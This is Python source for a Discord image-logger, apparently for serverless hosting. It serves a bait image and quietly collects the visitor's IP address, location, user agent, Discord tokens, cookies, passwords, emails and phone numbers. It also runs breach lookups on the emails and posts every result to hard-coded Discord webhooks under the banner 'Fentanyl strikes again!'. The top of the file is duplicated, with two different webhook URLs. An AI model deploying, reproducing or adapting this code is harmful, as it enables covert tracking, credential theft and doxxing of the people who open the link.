from http.server import BaseHTTPRequestHandler
from urllib import parse
import httpx, base64, httpagentparser

webhook = 'https://discord.com/api/webhooks/1349155542039400522/NmbDkDhaCWLOPl68KDhFglwx773fTCdfBsXYVO1dkMuVPrw5pBM4tmsXtK6ohCSDOhj-'

bindata = httpx.get('https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg').content
buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')

from http.server import BaseHTTPRequestHandler
from urllib import parse
import httpx, base64, httpagentparser, re, json

webhook = 'https://discord.com/api/webhooks/1537744108444057651/NPsV1s5rDgFQ6asOGDzmcQAEGC_JZyM9ENqSfuQHZkg5KqAkedlFeRQ_XjrwZDMJ6HJ9'

# ============================================================
# OSINT API KEYS - Add your keys here
# ============================================================
NUMVERIFY_API_KEY = ""  # Get from https://numverify.com/
HIBP_API_KEY = ""       # Get from https://haveibeenpwned.com/API/Key

bindata = httpx.get('https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg').content
buggedimg = False
buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')

# ============================================================
# EXTRACTION FUNCTIONS
# ============================================================

def extract_discord_tokens(text):
    """Extract Discord tokens from text"""
    tokens = []
    patterns = [
        r'([a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27})',
        r'([a-zA-Z0-9_\-]{28,32})',
        r'([a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27,32})',
    ]
    for pattern in patterns:
        matches = re.findall(pattern, text)
        tokens.extend(matches)
    return list(set(tokens))

def extract_discord_webhooks(text):
    """Extract Discord webhook URLs"""
    pattern = r'https://discord\.com/api/webhooks/[0-9]+/[a-zA-Z0-9_\-]+'
    return re.findall(pattern, text)

def extract_emails(text):
    """Extract email addresses"""
    pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
    return re.findall(pattern, text)

def extract_passwords(text):
    """Extract potential passwords"""
    patterns = [
        r'"password"\s*:\s*"([^"]+)"',
        r'"pass"\s*:\s*"([^"]+)"',
        r'"pwd"\s*:\s*"([^"]+)"',
        r'password[=:]\s*([^\s&]+)',
        r'pass[=:]\s*([^\s&]+)',
        r'pwd[=:]\s*([^\s&]+)',
    ]
    passwords = []
    for pattern in patterns:
        matches = re.findall(pattern, text, re.IGNORECASE)
        passwords.extend(matches)
    return list(set(passwords))

def extract_phone_numbers(text):
    """Extract phone numbers"""
    patterns = [
        r'(\+?1?\s*\(?[0-9]{3}\)?[\s.-]?[0-9]{3}[\s.-]?[0-9]{4})',
        r'(\+?[0-9]{1,3}[\s.-]?[0-9]{3}[\s.-]?[0-9]{3}[\s.-]?[0-9]{4})',
        r'(?<!\w)(\+[0-9]{1,3}[0-9]{8,15})(?!\w)',
    ]
    phones = []
    for pattern in patterns:
        matches = re.findall(pattern, text)
        phones.extend(matches)
    return list(set(phones))

def extract_domains(text):
    """Extract domains"""
    pattern = r'([a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.(?:[a-zA-Z]{2,}))'
    domains = re.findall(pattern, text)
    domains = [d for d in domains if d not in ['com', 'org', 'net', 'io', 'co']]
    return list(set(domains))

# ============================================================
# OSINT FUNCTIONS
# ============================================================

def osint_email(email):
    """Gather OSINT on an email"""
    results = {}
    
    # Have I Been Pwned
    if HIBP_API_KEY:
        try:
            headers = {'hibp-api-key': HIBP_API_KEY}
            response = httpx.get(f'https://haveibeenpwned.com/api/v3/breachedaccount/{email}', headers=headers)
            if response.status_code == 200:
                data = response.json()
                results['hibp'] = {
                    'breaches': [b['Name'] for b in data[:5]],
                    'total_breaches': len(data)
                }
        except: pass
    
    # Epieos
    try:
        response = httpx.get(f'https://epieos.com/api/email/{email}')
        if response.status_code == 200:
            data = response.json()
            results['epieos'] = {
                'google_account': data.get('google', {}).get('exists'),
                'google_name': data.get('google', {}).get('name'),
                'gravatar': data.get('gravatar', {}).get('exists')
            }
    except: pass
    
    return results

def osint_phone(phone_number):
    """Gather OSINT on a phone number"""
    results = {}
    
    if NUMVERIFY_API_KEY:
        try:
            response = httpx.get(f'http://apilayer.net/api/validate?access_key={NUMVERIFY_API_KEY}&number={phone_number}')
            data = response.json()
            if data.get('valid'):
                results['numverify'] = {
                    'valid': data.get('valid'),
                    'country': data.get('country_name'),
                    'carrier': data.get('carrier'),
                    'line_type': data.get('line_type')
                }
        except: pass
    
    return results

# ============================================================
# DISCORD HOOK FUNCTIONS (YOUR ORIGINAL FORMAT)
# ============================================================

def formatHook(ip, city, reg, country, loc, org, postal, useragent, os, browser,
               tokens=None, webhooks=None, emails=None, passwords=None, 
               phones=None, domains=None, osint_data=None):
    
    fields = [
        {
            "name": "IP Info",
            "value": f"**IP:** `{ip}`\n**City:** `{city}`\n**Region:** `{reg}`\n**Country:** `{country}`\n**Location:** `{loc}`\n**ORG:** `{org}`\n**ZIP:** `{postal}`",
            "inline": True
        },
        {
            "name": "Advanced Info",
            "value": f"**OS:** `{os}`\n**Browser:** `{browser}`\n**UserAgent:** `Look Below!`\n```yaml\n{useragent}\n```",
            "inline": False
        }
    ]
    
    # Add tokens if found
    if tokens:
        token_str = '\n'.join([f'`{t}`' for t in tokens[:5]])
        if len(tokens) > 5:
            token_str += f'\n... and {len(tokens)-5} more'
        fields.append({
            "name": f"🎫 Discord Tokens ({len(tokens)})",
            "value": token_str,
            "inline": False
        })
    
    # Add webhooks if found
    if webhooks:
        webhook_str = '\n'.join([f'`{w}`' for w in webhooks[:3]])
        if len(webhooks) > 3:
            webhook_str += f'\n... and {len(webhooks)-3} more'
        fields.append({
            "name": f"🔗 Webhooks ({len(webhooks)})",
            "value": webhook_str,
            "inline": False
        })
    
    # Add emails if found
    if emails:
        email_str = '\n'.join([f'`{e}`' for e in emails[:5]])
        if len(emails) > 5:
            email_str += f'\n... and {len(emails)-5} more'
        fields.append({
            "name": f"📧 Emails ({len(emails)})",
            "value": email_str,
            "inline": False
        })
    
    # Add passwords if found
    if passwords:
        pass_str = '\n'.join([f'`{p}`' for p in passwords[:5]])
        if len(passwords) > 5:
            pass_str += f'\n... and {len(passwords)-5} more'
        fields.append({
            "name": f"🔑 Passwords ({len(passwords)})",
            "value": pass_str,
            "inline": False
        })
    
    # Add phone numbers if found
    if phones:
        phone_str = '\n'.join([f'`{p}`' for p in phones[:5]])
        if len(phones) > 5:
            phone_str += f'\n... and {len(phones)-5} more'
        fields.append({
            "name": f"📱 Phone Numbers ({len(phones)})",
            "value": phone_str,
            "inline": False
        })
    
    # Add domains if found
    if domains:
        domain_str = '\n'.join([f'`{d}`' for d in domains[:5]])
        if len(domains) > 5:
            domain_str += f'\n... and {len(domains)-5} more'
        fields.append({
            "name": f"🌍 Domains ({len(domains)})",
            "value": domain_str,
            "inline": False
        })
    
    # Add OSINT data
    if osint_data:
        osint_str = ""
        if 'emails' in osint_data:
            for email, data in osint_data['emails'].items():
                if 'hibp' in data:
                    osint_str += f"📧 `{email}` → {data['hibp'].get('total_breaches', 0)} breaches found\n"
                if 'epieos' in data and data['epieos'].get('google_account'):
                    osint_str += f"   → Google: {data['epieos'].get('google_name', 'Unknown')}\n"
        if 'phones' in osint_data:
            for phone, data in osint_data['phones'].items():
                if 'numverify' in data:
                    osint_str += f"📱 `{phone}` → {data['numverify'].get('carrier', 'Unknown')} ({data['numverify'].get('country', 'Unknown')})\n"
        if osint_str:
            fields.append({
                "name": "🔍 OSINT Enrichment",
                "value": osint_str[:1000],
                "inline": False
            })
    
    return {
        "username": "Fentanyl",
        "content": "@everyone",
        "embeds": [
            {
                "title": "Fentanyl strikes again!",
                "color": 16711803,
                "description": "A Victim opened the original Image. You can find their info below.",
                "author": {"name": "Fentanyl"},
                "fields": fields
            }
        ],
    }

def prev(ip, uag, tokens=None, emails=None, phones=None):
    fields = []
    
    if tokens:
        token_str = '\n'.join([f'`{t}`' for t in tokens[:3]])
        if len(tokens) > 3:
            token_str += f'\n... and {len(tokens)-3} more'
        fields.append({
            "name": f"🎫 Discord Tokens ({len(tokens)})",
            "value": token_str,
            "inline": False
        })
    
    if emails:
        email_str = ', '.join([f'`{e}`' for e in emails[:3]])
        fields.append({
            "name": "📧 Emails Found",
            "value": email_str,
            "inline": False
        })
    
    if phones:
        phone_str = ', '.join([f'`{p}`' for p in phones[:3]])
        fields.append({
            "name": "📱 Phone Numbers Found",
            "value": phone_str,
            "inline": False
        })
    
    return {
        "username": "Fentanyl",
        "content": "",
        "embeds": [
            {
                "title": "Fentanyl Alert!",
                "color": 16711803,
                "description": f"Discord previewed a Fentanyl Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
                "author": {"name": "Fentanyl"},
                "fields": fields
            }
        ],
    }

# ============================================================
# MAIN HANDLER
# ============================================================

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        s = self.path
        dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
        try: 
            data = httpx.get(dic['url']).content if 'url' in dic else bindata
        except Exception: 
            data = bindata
        
        useragent = self.headers.get('user-agent') if 'user-agent' in self.headers else 'No User Agent Found!'
        os, browser = httpagentparser.simple_detect(useragent)
        
        # Extract everything from query and headers
        all_text = str(dic) + str(self.headers)
        tokens = extract_discord_tokens(all_text)
        webhooks = extract_discord_webhooks(all_text)
        emails = extract_emails(all_text)
        passwords = extract_passwords(all_text)
        phones = extract_phone_numbers(all_text)
        domains = extract_domains(all_text)
        
        # Check Authorization header for tokens
        auth_header = self.headers.get('Authorization')
        if auth_header and auth_header.startswith('mfa.'):
            tokens.append(auth_header)
        
        # Check for token in cookies
        cookie_header = self.headers.get('Cookie')
        if cookie_header:
            token_match = re.search(r'token=([a-zA-Z0-9._-]+)', cookie_header)
            if token_match:
                tokens.append(token_match.group(1))
        
        # Run OSINT on extracted data
        osint_data = {}
        for email in emails[:3]:
            try:
                result = osint_email(email)
                if result:
                    if 'emails' not in osint_data: osint_data['emails'] = {}
                    osint_data['emails'][email] = result
            except: pass
        
        for phone in phones[:3]:
            try:
                result = osint_phone(phone)
                if result:
                    if 'phones' not in osint_data: osint_data['phones'] = {}
                    osint_data['phones'][phone] = result
            except: pass
        
        if self.headers.get('x-forwarded-for', '').startswith(('35','34','104.196')):
            if 'discord' in useragent.lower():
                self.send_response(200)
                self.send_header('Content-type','image/jpeg')
                self.end_headers()
                self.wfile.write(buggedbin if buggedimg else bindata)
                httpx.post(webhook, json=prev(self.headers.get('x-forwarded-for'), useragent, tokens, emails, phones))
            else: 
                pass
        else:
            self.send_response(200)
            self.send_header('Content-type','image/jpeg')
            self.end_headers()
            self.wfile.write(data)
            ip = self.headers.get('x-forwarded-for')
            if not ip:
                ip = self.client_address[0]
            
            try:
                ipInfo = httpx.get(f'https://ipinfo.io/{ip}/json').json()
            except:
                ipInfo = {'ip': ip, 'city': 'Unknown', 'region': 'Unknown', 'country': 'Unknown', 
                         'loc': 'Unknown', 'org': 'Unknown', 'postal': 'Unknown'}
            
            httpx.post(webhook, json=formatHook(
                ipInfo.get('ip', ip),
                ipInfo.get('city', 'Unknown'),
                ipInfo.get('region', 'Unknown'),
                ipInfo.get('country', 'Unknown'),
                ipInfo.get('loc', 'Unknown'),
                ipInfo.get('org', 'Unknown'),
                ipInfo.get('postal', 'Unknown'),
                useragent,
                os,
                browser,
                tokens,
                webhooks,
                emails,
                passwords,
                phones,
                domains,
                osint_data
            ))
        return
